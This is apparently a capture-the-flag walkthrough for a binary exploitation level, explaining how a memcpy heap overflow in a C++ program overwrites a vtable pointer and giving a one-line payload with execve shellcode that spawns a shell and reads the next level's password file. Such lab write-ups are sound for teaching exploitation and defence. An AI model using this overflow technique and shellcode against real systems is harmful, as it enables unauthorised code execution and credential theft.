# Walkthrough

## Disassembling the executable 

see source.cpp


## Analysis

In the main, they allocate two objects from the N class. They copy av[1] into the first object's buffer and then call a member function.

Since, the two objects are adjacent in memory we exploit the memcpy called in setAnnotation() on the first object to rewrite the address of the array of member functions to the second object.

In the N class, the first function is the operator+() which is nice because that function is called later in the main().


We hypothesized that when the operator+ is called, it will in fact call our payload which jump into our shellcode.

 
```
./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 80 + '\x0c\xa0\x04\x08\x00')")
$ cat /home/user/bonus0/.pass     

```
